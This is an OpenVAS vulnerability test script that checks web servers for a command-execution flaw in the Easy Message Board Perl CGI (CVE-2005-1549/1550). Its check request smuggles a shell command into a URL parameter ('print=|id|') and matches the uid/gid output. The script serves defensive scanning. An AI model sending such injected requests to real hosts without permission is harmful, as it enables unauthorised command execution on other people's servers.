###############################################################################
# OpenVAS Vulnerability Test
# $Id: easy_message_board_cmd_exec.nasl 9788 2018-05-09 15:53:43Z cfischer $
#
# Easy Message Board Command Execution
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2005 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# SoulBlack Group <soulblacktm@gmail.com>
# 2005-05-09 00:59
# Easy Message Board Directory Traversal and Remote Command

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.18211");
  script_version("$Revision: 9788 $");
  script_tag(name:"last_modification", value:"$Date: 2018-05-09 17:53:43 +0200 (Wed, 09 May 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2005-1549", "CVE-2005-1550");
  script_bugtraq_id(13555, 13551);
  script_name("Easy Message Board Command Execution");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"The remote host is running Easy Message Board, a bulletin board system
  written in perl.

  The remote version of this script contains an input validation flaw.");

  script_tag(name:"impact", value:"This flaw may be used by an attacker to perform a directory traversal attack
  or execute arbitrary commands on the remote host with the privileges of
  the web server.");

  script_tag(name:"solution", value:"Upgrade to the newest version of this CGI or disable it");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_check_remote_code (
                        check_request:"/easymsgb.pl?print=|id|",
                        extra_check:"<fint color=Blue>uid=[0-9]+.*gid=[0-9]+.*</b></font>",
                        check_result:"uid=[0-9]+.*gid=[0-9]+.*",
                        command:"id"
                        );

exit( 99 );